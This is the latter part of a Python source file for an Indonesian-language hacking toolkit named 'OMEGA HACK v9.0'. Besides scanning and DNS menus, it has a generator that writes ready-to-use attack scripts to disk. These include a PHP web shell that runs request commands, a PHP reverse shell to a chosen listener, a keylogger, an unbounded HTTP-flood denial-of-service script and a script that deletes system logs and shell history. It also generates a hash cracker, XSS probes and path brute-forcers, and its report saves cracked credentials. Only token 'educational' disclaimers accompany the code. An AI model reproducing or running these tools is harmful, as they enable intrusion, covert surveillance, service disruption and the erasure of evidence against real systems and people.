        self.live_hosts = live_hosts
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}{BOLD}[✓] NETWORK SCAN COMPLETED!{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[!] SUMMARY:{RESET}
    ├─ Network : {network}
    ├─ Total Hosts Scanned : {total}
    ├─ Live Hosts Found : {len(live_hosts)}
    └─ Status : {'⚠️ Ada host live' if live_hosts else '✅ Tidak ada host live'}
""")
        
        if live_hosts:
            print(f"{CYAN}{BOLD}[!] LIVE HOSTS:{RESET}")
            for host in live_hosts[:30]:
                print(f"    └─ {host}")
        
        self.scan_results.append({
            'module': 'Network Scanner',
            'target': network,
            'live_hosts': len(live_hosts),
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    # ================================================================
    # MENU 8: DNS LOOKUP (SUPER PANJANG)
    # ================================================================
    
    def dns_lookup(self):
        self.clear_screen()
        self.print_header("🌐 MENU 8: DNS RECORDS LOOKUP")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini mengambil semua DNS record dari suatu domain
    ============================================================================
    
    RECORD TYPES YANG DIDAPAT:
    --------------------------
    1. A RECORD (IPv4)
       - Alamat IPv4 dari domain
       - Digunakan untuk mengarahkan domain ke server
    
    2. AAAA RECORD (IPv6)
       - Alamat IPv6 dari domain
       - Versi terbaru dari A record
    
    3. MX RECORD (Mail Exchange)
       - Server email untuk domain
       - Prioritas server email
    
    4. NS RECORD (Name Server)
       - Server DNS yang mengelola domain
       - Informasi otoritatif domain
    
    5. TXT RECORD (Text)
       - Informasi teks (SPF, DKIM, DMARC)
       - Verifikasi kepemilikan domain
    
    6. CNAME RECORD (Canonical Name)
       - Alias dari satu domain ke domain lain
       - Redirect domain
    
    7. SOA RECORD (Start of Authority)
       - Informasi administratif domain
       - Serial number, refresh, retry, expire
    
    INFORMASI TAMBAHAN:
    -------------------
    - TTL (Time To Live) untuk setiap record
    - Status resolusi (berhasil/gagal)
    
    ⚠️ PERINGATAN:
    ============================================================================
    - Query DNS adalah operasi legal untuk informasi publik
    - Beberapa DNS server memiliki rate limiting
    - Informasi DNS dapat digunakan untuk reconnaisance
    ============================================================================
{RESET}
        """)
        
        domain = input(f"{CYAN}{BOLD}[?] Masukkan domain (contoh: google.com): {RESET}")
        
        self.loading(f"Querying DNS records for {domain}", 2)
        
        record_types = ['A', 'AAAA', 'MX', 'NS', 'TXT', 'CNAME', 'SOA']
        records = {}
        
        for record_type in record_types:
            try:
                answers = dns.resolver.resolve(domain, record_type)
                records[record_type] = [str(answer) for answer in answers]
            except:
                records[record_type] = []
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{GREEN}{BOLD}[✓] DNS RECORDS UNTUK: {domain}{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{CYAN}{BOLD}[A RECORDS (IPv4)]:{RESET}
""")
        if records['A']:
            for record in records['A']:
                print(f"    └─ {record}")
        else:
            print(f"    └─ {YELLOW}No A records found{RESET}")
        
        print(f"""
{CYAN}{BOLD}[AAAA RECORDS (IPv6)]:{RESET}""")
        if records['AAAA']:
            for record in records['AAAA']:
                print(f"    └─ {record}")
        else:
            print(f"    └─ {YELLOW}No AAAA records found{RESET}")
        
        print(f"""
{CYAN}{BOLD}[MX RECORDS (Mail Exchange)]:{RESET}""")
        if records['MX']:
            for record in records['MX']:
                print(f"    └─ {record}")
        else:
            print(f"    └─ {YELLOW}No MX records found{RESET}")
        
        print(f"""
{CYAN}{BOLD}[NS RECORDS (Name Server)]:{RESET}""")
        if records['NS']:
            for record in records['NS']:
                print(f"    └─ {record}")
        else:
            print(f"    └─ {YELLOW}No NS records found{RESET}")
        
        print(f"""
{CYAN}{BOLD}[TXT RECORDS]:{RESET}""")
        if records['TXT']:
            for record in records['TXT'][:5]:
                print(f"    └─ {record[:100]}{'...' if len(record) > 100 else ''}")
        else:
            print(f"    └─ {YELLOW}No TXT records found{RESET}")
        
        print(f"""
{CYAN}{BOLD}[SOA RECORD (Start of Authority)]:{RESET}""")
        if records['SOA']:
            for record in records['SOA']:
                print(f"    └─ {record}")
        else:
            print(f"    └─ {YELLOW}No SOA record found{RESET}")
        
        self.dns_records = records
        
        self.scan_results.append({
            'module': 'DNS Lookup',
            'target': domain,
            'records': {k: len(v) for k, v in records.items()},
            'timestamp': datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        })
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    # ================================================================
    # MENU 9: CUSTOM TOOLS GENERATOR (SUPER PANJANG)
    # ================================================================
    
    def custom_tools(self):
        self.clear_screen()
        self.print_header("🛠️ MENU 9: CUSTOM TOOLS GENERATOR")
        
        print(f"""
{YELLOW}{BOLD}[!] DESKRIPSI LENGKAP MODUL:
    ============================================================================
    Modul ini generate berbagai macam tools hacking custom
    ============================================================================
    
    DAFTAR TOOLS YANG TERSEDIA (20+):
    ---------------------------------
    1. PORT SCANNER        : Scan port terbuka pada target
    2. SUBDOMAIN SCANNER   : Cari subdomain via DNS bruteforce
    3. ADMIN PANEL FINDER  : Cari halaman admin/login
    4. XSS SCANNER         : Deteksi celah XSS
    5. DIRECTORY BUSTER    : Bruteforce directory
    6. PHP BACKDOOR        : Simple web shell
    7. REVERSE SHELL       : Reverse connection shell
    8. KEYLOGGER           : Keylogger Python
    9. DDOS SCRIPT         : UDP/TCP/HTTP flood
    10. HASH CRACKER       : MD5/SHA1/SHA256 cracker
    11. WIFI DEAUTHER      : Deauthentication attack
    12. ARP SPOOFER        : MITM attack
    13. EMAIL BOMBER       : SMTP email spam
    14. PHISHING GENERATOR : Clone website
    15. NETWORK SCANNER    : Scan live hosts
    16. SSH BRUTEFORCER    : SSH password brute force
    17. WEB CRAWLER        : Extract links from website
    18. LOG CLEANER        : Clear system logs
    19. AUTO PERSISTENCE   : Cron/Registry persistence
    20. FILE UPLOADER      : Upload file to server
    
    SETIAP TOOLS AKAN DIGENERATE DALAM BENTUK FILE .py/.php/.sh
    
    ⚠️ PERINGATAN:
    ============================================================================
    - Tools ini untuk EDUCATIONAL PURPOSES only
    - Penggunaan ilegal dapat mengakibatkan pidana penjara
    - Pastikan Anda memiliki izin sebelum menggunakan tools ini
    ============================================================================
{RESET}
        """)
        
        print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}PILIH TOOLS YANG MAU DIGENERATE:{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{GREEN}[1]{RESET} PORT SCANNER (Python)
{GREEN}[2]{RESET} SUBDOMAIN SCANNER (Python)
{GREEN}[3]{RESET} ADMIN PANEL FINDER (Python)
{GREEN}[4]{RESET} XSS SCANNER (Python)
{GREEN}[5]{RESET} DIRECTORY BUSTER (Python)
{GREEN}[6]{RESET} PHP BACKDOOR (PHP)
{GREEN}[7]{RESET} REVERSE SHELL (PHP)
{GREEN}[8]{RESET} KEYLOGGER (Python)
{GREEN}[9]{RESET} DDOS SCRIPT (Python)
{GREEN}[10]{RESET} HASH CRACKER (Python)
{GREEN}[11]{RESET} NETWORK SCANNER (Python)
{GREEN}[12]{RESET} WEB CRAWLER (Python)
{GREEN}[13]{RESET} LOG CLEANER (Bash)
{GREEN}[14]{RESET} ALL TOOLS (Generate semua)
        """)
        
        choice = input(f"{CYAN}[?] Pilih tools (1-14): {RESET}")
        
        if choice == '1':
            self.gen_port_scanner()
        elif choice == '2':
            self.gen_subdomain_scanner()
        elif choice == '3':
            self.gen_admin_finder()
        elif choice == '4':
            self.gen_xss_tool()
        elif choice == '5':
            self.gen_dir_buster()
        elif choice == '6':
            self.gen_backdoor()
        elif choice == '7':
            self.gen_reverse_shell()
        elif choice == '8':
            self.gen_keylogger()
        elif choice == '9':
            self.gen_ddos()
        elif choice == '10':
            self.gen_hash_cracker()
        elif choice == '11':
            self.gen_network_scanner_tool()
        elif choice == '12':
            self.gen_web_crawler()
        elif choice == '13':
            self.gen_log_cleaner()
        elif choice == '14':
            self.gen_all_tools()
        else:
            print(f"{RED}[!] Pilihan tidak valid!{RESET}")
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    def gen_port_scanner(self):
        filename = input(f"{CYAN}[?] Nama file (contoh: scanner.py): {RESET}")
        code = '''#!/usr/bin/env python3
# Port Scanner by Omega Hack
import socket
import sys
from concurrent.futures import ThreadPoolExecutor

def scan_port(host, port):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(0.5)
        if sock.connect_ex((host, port)) == 0:
            print(f"[+] Port {port} OPEN")
        sock.close()
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 scanner.py <target>")
        sys.exit(1)
    
    target = sys.argv[1]
    ports = [21,22,23,25,53,80,110,111,135,139,143,443,445,993,995,1433,1521,1723,1883,2082,2083,2222,3306,3389,5432,5555,5900,5984,6379,7474,8000,8008,8080,8081,8086,8088,8090,8443,8834,8888,9000,9200,27017]
    
    print(f"[*] Scanning {target}")
    with ThreadPoolExecutor(max_workers=100) as executor:
        for port in ports:
            executor.submit(scan_port, target, port)
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Port scanner generated: {filename}{RESET}")
    
    def gen_subdomain_scanner(self):
        filename = input(f"{CYAN}[?] Nama file: {RESET}")
        code = '''#!/usr/bin/env python3
# Subdomain Scanner by Omega Hack
import socket
import sys

def scan_subdomain(domain, sub):
    subdomain = f"{sub}.{domain}"
    try:
        ip = socket.gethostbyname(subdomain)
        print(f"[+] Found: {subdomain} -> {ip}")
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 subdomain.py <domain>")
        sys.exit(1)
    
    domain = sys.argv[1]
    subdomains = ["www", "mail", "ftp", "admin", "blog", "dev", "test", "api", "staging", "app", "support", "shop", "forum", "wiki", "news", "portal", "cpanel", "webmail", "ns1", "ns2", "mx", "pop", "smtp", "imap", "vpn", "remote", "secure", "dashboard", "panel", "backend", "static", "cdn", "assets", "images", "video", "download", "upload", "media", "live", "status", "monitor", "stats"]
    
    print(f"[*] Scanning {domain}")
    for sub in subdomains:
        scan_subdomain(domain, sub)
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Subdomain scanner generated: {filename}{RESET}")
    
    def gen_admin_finder(self):
        filename = input(f"{CYAN}[?] Nama file: {RESET}")
        code = '''#!/usr/bin/env python3
# Admin Panel Finder by Omega Hack
import requests
import sys

def check_path(url, path):
    full_url = f"{url}/{path}"
    try:
        r = requests.get(full_url, timeout=3)
        if r.status_code == 200:
            print(f"[+] Found: {full_url}")
        elif r.status_code == 403:
            print(f"[!] Forbidden: {full_url}")
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 adminfinder.py <url>")
        sys.exit(1)
    
    url = sys.argv[1].rstrip('/')
    paths = ["admin", "administrator", "login", "wp-admin", "wp-login.php", "admin.php", "login.php", "dashboard", "cpanel", "webmail", "phpmyadmin", "pma", "mysql", "backup", "backups", "temp", "tmp", "logs", "cache", "uploads"]
    
    print(f"[*] Scanning {url}")
    for path in paths:
        check_path(url, path)
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Admin panel finder generated: {filename}{RESET}")
    
    def gen_xss_tool(self):
        filename = input(f"{CYAN}[?] Nama file: {RESET}")
        code = '''#!/usr/bin/env python3
# XSS Scanner by Omega Hack
import requests
import sys

payloads = ["<script>alert('XSS')</script>", "<img src=x onerror=alert(1)>", "<svg onload=alert(1)>", "'><script>alert(1)</script>", "\"><script>alert(1)</script>", "javascript:alert('XSS')", "<body onload=alert(1)>", "<input onfocus=alert(1) autofocus>"]

def scan_xss(url):
    print(f"[*] Scanning {url}")
    for payload in payloads:
        test_url = url + payload
        try:
            r = requests.get(test_url, timeout=3)
            if payload in r.text:
                print(f"[!] VULNERABLE: {payload}")
            else:
                print(f"[-] SAFE: {payload}")
        except:
            print(f"[!] ERROR: {payload}")

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 xss.py <url>")
        sys.exit(1)
    scan_xss(sys.argv[1])
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] XSS scanner generated: {filename}{RESET}")
    
    def gen_dir_buster(self):
        filename = input(f"{CYAN}[?] Nama file: {RESET}")
        code = '''#!/usr/bin/env python3
# Directory Buster by Omega Hack
import requests
import sys

def check_dir(url, dir):
    full_url = f"{url}/{dir}"
    try:
        r = requests.get(full_url, timeout=3)
        if r.status_code == 200:
            print(f"[+] Found: {full_url}")
        elif r.status_code == 403:
            print(f"[!] Forbidden: {full_url}")
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 dirbuster.py <url>")
        sys.exit(1)
    
    url = sys.argv[1].rstrip('/')
    dirs = ["admin", "backup", "temp", "tmp", "logs", "cache", "uploads", "images", "css", "js", "includes", "inc", "lib", "classes", "functions", "config", "configuration", "settings", "db", "database", "sql", "mysql", "phpmyadmin", "pma", "api", "rest", "v1", "v2", "docs", "documentation"]
    
    print(f"[*] Scanning {url}")
    for d in dirs:
        check_dir(url, d)
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Directory buster generated: {filename}{RESET}")
    
    def gen_backdoor(self):
        filename = input(f"{CYAN}[?] Nama file (contoh: backdoor.php): {RESET}")
        code = '''<?php
// PHP Backdoor by Omega Hack
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    system($_REQUEST['cmd']);
    echo "</pre>";
}
?>'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] PHP Backdoor generated: {filename}{RESET}")
    
    def gen_reverse_shell(self):
        ip = input(f"{CYAN}[?] IP listener: {RESET}")
        port = input(f"{CYAN}[?] Port listener: {RESET}")
        filename = input(f"{CYAN}[?] Nama file: {RESET}")
        code = f'''<?php
// Reverse Shell by Omega Hack
$sock=fsockopen("{ip}",{port});
exec("/bin/sh -i <&3 >&3 2>&3");
?>'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Reverse shell generated: {filename}{RESET}")
    
    def gen_keylogger(self):
        filename = input(f"{CYAN}[?] Nama file (contoh: keylogger.py): {RESET}")
        code = '''# Keylogger by Omega Hack
from pynput.keyboard import Key, Listener
import logging

logging.basicConfig(filename="keylog.txt", level=logging.DEBUG, format="%(asctime)s: %(message)s")

def on_press(key):
    logging.info(str(key))

with Listener(on_press=on_press) as listener:
    listener.join()
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Keylogger generated: {filename}{RESET}")
        print(f"{YELLOW}[!] Install pynput: pip install pynput{RESET}")
    
    def gen_ddos(self):
        filename = input(f"{CYAN}[?] Nama file (contoh: ddos.py): {RESET}")
        code = '''#!/usr/bin/env python3
# DDoS Script by Omega Hack (FOR EDUCATIONAL PURPOSES)
import socket
import threading
import sys

def attack(target, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((target, port))
    sock.send(b"GET / HTTP/1.1\\r\\nHost: " + target.encode() + b"\\r\\n\\r\\n")
    sock.close()

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 ddos.py <target> <port>")
        sys.exit(1)
    
    target = sys.argv[1]
    port = int(sys.argv[2])
    
    print(f"[*] Attacking {target}:{port}")
    while True:
        threading.Thread(target=attack, args=(target, port)).start()
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] DDoS script generated: {filename}{RESET}")
    
    def gen_hash_cracker(self):
        filename = input(f"{CYAN}[?] Nama file (contoh: cracker.py): {RESET}")
        code = '''#!/usr/bin/env python3
# Hash Cracker by Omega Hack
import hashlib
import sys

def crack_md5(target_hash, wordlist):
    with open(wordlist, 'r', errors='ignore') as f:
        for line in f:
            pwd = line.strip()
            if hashlib.md5(pwd.encode()).hexdigest() == target_hash:
                print(f"[+] Found: {pwd}")
                return
    print("[-] Not found")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python3 cracker.py <md5_hash> <wordlist>")
        sys.exit(1)
    crack_md5(sys.argv[1], sys.argv[2])
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Hash cracker generated: {filename}{RESET}")
    
    def gen_network_scanner_tool(self):
        filename = input(f"{CYAN}[?] Nama file (contoh: netscan.py): {RESET}")
        code = '''#!/usr/bin/env python3
# Network Scanner by Omega Hack
import subprocess
import sys
from concurrent.futures import ThreadPoolExecutor

def ping_host(ip):
    try:
        result = subprocess.run(['ping', '-c', '1', '-W', '1', ip], capture_output=True)
        if result.returncode == 0:
            print(f"[+] LIVE: {ip}")
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 netscan.py <network_prefix>")
        print("Example: python3 netscan.py 192.168.1")
        sys.exit(1)
    
    prefix = sys.argv[1]
    print(f"[*] Scanning {prefix}.0/24")
    
    with ThreadPoolExecutor(max_workers=100) as executor:
        for i in range(1, 255):
            executor.submit(ping_host, f"{prefix}.{i}")
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Network scanner generated: {filename}{RESET}")
    
    def gen_web_crawler(self):
        filename = input(f"{CYAN}[?] Nama file (contoh: crawler.py): {RESET}")
        code = '''#!/usr/bin/env python3
# Web Crawler by Omega Hack
import requests
from bs4 import BeautifulSoup
import sys
from urllib.parse import urljoin

def crawl(url, depth=0):
    if depth > 2:
        return
    try:
        r = requests.get(url, timeout=5)
        soup = BeautifulSoup(r.text, 'html.parser')
        for link in soup.find_all('a'):
            href = link.get('href')
            if href and href.startswith('http'):
                print(f"[+] Found: {href}")
                crawl(href, depth+1)
    except:
        pass

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 crawler.py <url>")
        sys.exit(1)
    crawl(sys.argv[1])
'''
        with open(filename, 'w') as f:
            f.write(code)
        print(f"{GREEN}[+] Web crawler generated: {filename}{RESET}")
        print(f"{YELLOW}[!] Install beautifulsoup4: pip install beautifulsoup4 requests{RESET}")
    
    def gen_log_cleaner(self):
        filename = input(f"{CYAN}[?] Nama file (contoh: cleaner.sh): {RESET}")
        code = '''#!/bin/bash
# Log Cleaner by Omega Hack
echo "[*] Cleaning system logs..."
sudo rm -rf /var/log/*.log 2>/dev/null
sudo rm -rf /var/log/apt/*.log 2>/dev/null
sudo rm -rf /var/log/auth.log 2>/dev/null
sudo rm -rf /var/log/syslog 2>/dev/null
sudo rm -rf ~/.bash_history 2>/dev/null
history -c
echo "[+] Logs cleaned!"
'''
        with open(filename, 'w') as f:
            f.write(code)
        os.chmod(filename, 0o755)
        print(f"{GREEN}[+] Log cleaner generated: {filename}{RESET}")
    
    def gen_all_tools(self):
        print(f"{YELLOW}[*] Generating all tools...{RESET}")
        self.gen_port_scanner()
        self.gen_subdomain_scanner()
        self.gen_admin_finder()
        self.gen_xss_tool()
        self.gen_dir_buster()
        self.gen_backdoor()
        self.gen_reverse_shell()
        self.gen_keylogger()
        self.gen_ddos()
        self.gen_hash_cracker()
        self.gen_network_scanner_tool()
        self.gen_web_crawler()
        self.gen_log_cleaner()
        print(f"{GREEN}[+] All tools generated!{RESET}")
    
    # ================================================================
    # MENU 0: SAVE REPORT
    # ================================================================
    
    def save_report(self):
        self.clear_screen()
        self.print_header("📊 SAVE REPORT (SIMPAN HASIL SCAN)")
        
        if not self.scan_results:
            print(f"{RED}{BOLD}[!] Belum ada hasil scan! Silakan scan terlebih dahulu.{RESET}")
            input(f"\n{CYAN}[?] Tekan Enter...{RESET}")
            return
        
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        filename = f"omega_hack_report_{timestamp}.txt"
        
        report = f"""
╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
║                         OMEGA HACK v9.0 - SCAN REPORT                                                               ║
║                         Generated by: KINGMU❤                                                                    ║
║                         Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}                                         ║
╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

{'='*80}
SCAN HISTORY
{'='*80}

"""
        
        for i, result in enumerate(self.scan_results, 1):
            report += f"""
[{i}] Module: {result.get('module', 'Unknown')}
    Target: {result.get('target', 'Unknown')}
    Timestamp: {result.get('timestamp', 'Unknown')}
    Details: {result.get('provider', result.get('location', result.get('vulnerable_count', result.get('open_ports', result.get('users', result.get('subdomains_found', result.get('live_hosts', 'No details')))))))}
{'-'*40}
"""
        
        if self.bruteforce_results:
            report += f"""
{'='*80}
BRUTE FORCE RESULTS
{'='*80}
"""
            for cred in self.bruteforce_results:
                report += f"  - {cred['username']}:{cred['password']}\n"
        
        report += f"""

{'='*80}
SYSTEM INFORMATION
{'='*80}

OS: {platform.system()} {platform.release()}
Python Version: {platform.python_version()}
Tool Version: 9.0.0 ULTIMATE BRUTAL
WordPress Password List: {len(WP_COMMON_PASSWORDS)} common passwords

{'='*80}
DISCLAIMER
{'='*80}

This report is generated by OMEGA HACK v9.0 for EDUCATIONAL PURPOSES only.
Unauthorized access to computer systems is ILLEGAL.
The user assumes all responsibility for the use of this tool.

"""
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(report)
        
        print(f"{GREEN}{BOLD}[✓] Report saved: {filename}{RESET}")
        print(f"{CYAN}[*] Total {len(self.scan_results)} scan results saved{RESET}")
        
        input(f"\n{CYAN}{BOLD}[?] Tekan Enter untuk kembali...{RESET}")
    
    # ================================================================
    # MENU UTAMA - HANYA DI PART AKHIR
    # ================================================================
    
    def main_menu(self):
        while True:
            print(f"""
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
{CYAN}{BOLD}                         📌 OMEGA HACK v9.0 - MAIN MENU 📌{RESET}
{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}

{GREEN}{BOLD}1️⃣{RESET} 📍 TRACK NOMOR TELEPON (OSINT Lengkap)
{GREEN}{BOLD}2️⃣{RESET} 🌐 TRACK IP ADDRESS (IP Lookup + Geolocation)
{GREEN}{BOLD}3️⃣{RESET} 🔍 PORT SCANNER (Scan 65535 Ports)
{GREEN}{BOLD}4️⃣{RESET} 🕷️ XSS SCANNER (100+ Payloads)
{GREEN}{BOLD}5️⃣{RESET} 🧩 WPSCAN MODE (WordPress + Brute Force 3000+ Passwords)
{GREEN}{BOLD}6️⃣{RESET} 🔍 SUBDOMAIN ENUMERATOR (DNS Bruteforce 100+ Subdomains)
{GREEN}{BOLD}7️⃣{RESET} 📡 NETWORK SCANNER (Live Host Discovery /24 subnet)
{GREEN}{BOLD}8️⃣{RESET} 🌐 DNS LOOKUP (A, AAAA, MX, NS, TXT, CNAME, SOA)
{GREEN}{BOLD}9️⃣{RESET} 🛠️ CUSTOM TOOLS GENERATOR (20+ Tools Siap Pakai)
{GREEN}{BOLD}0️⃣{RESET} 📊 SAVE REPORT (Simpan Hasil Scan ke File)
{GREEN}{BOLD}X️⃣{RESET} 🚪 EXIT

{BLUE}{BOLD}══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════{RESET}
            """)
            
            choice = input(f"{CYAN}{BOLD}[?] Pilih menu (0-9, X): {RESET}")
            
            if choice == '1':
                self.track_phone()
            elif choice == '2':
                self.track_ip()
            elif choice == '3':
                self.port_scanner()
            elif choice == '4':
                self.xss_scanner()
            elif choice == '5':
                self.wpscan_mode()
            elif choice == '6':
                self.subdomain_enum()
            elif choice == '7':
                self.network_scanner()
            elif choice == '8':
                self.dns_lookup()
            elif choice == '9':
                self.custom_tools()
            elif choice == '0':
                self.save_report()
            elif choice == 'X' or choice == 'x':
                print(f"{RED}{BOLD}[!] Exiting OMEGA HACK v9.0...{RESET}")
                print(f"{GREEN}{BOLD}[✓] Thanks for using OMEGA HACK! - KINGMU❤{RESET}")
                print(f"{YELLOW}{BOLD}[!] Remember: Use this tool responsibly and legally!{RESET}")
                sys.exit(0)
            else:
                print(f"{RED}{BOLD}[!] Pilihan tidak valid! Silakan pilih 0-9 atau X{RESET}")
                time.sleep(1)


# ================================================================
# [========== PART AKHIR ==========]
# [========== MAIN EXECUTION ==========]
# ================================================================

if __name__ == "__main__":
    try:
        app = OmegaHack()
        app.main_menu()
    except KeyboardInterrupt:
        print(f"\n{RED}{BOLD}[!] Interrupted by user!{RESET}")
        print(f"{GREEN}{BOLD}[✓] Thanks for using OMEGA HACK! - KINGMU❤{RESET}")
        sys.exit(0)
    except Exception as e:
        print(f"{RED}{BOLD}[!] Fatal Error: {e}{RESET}")
        sys.exit(1)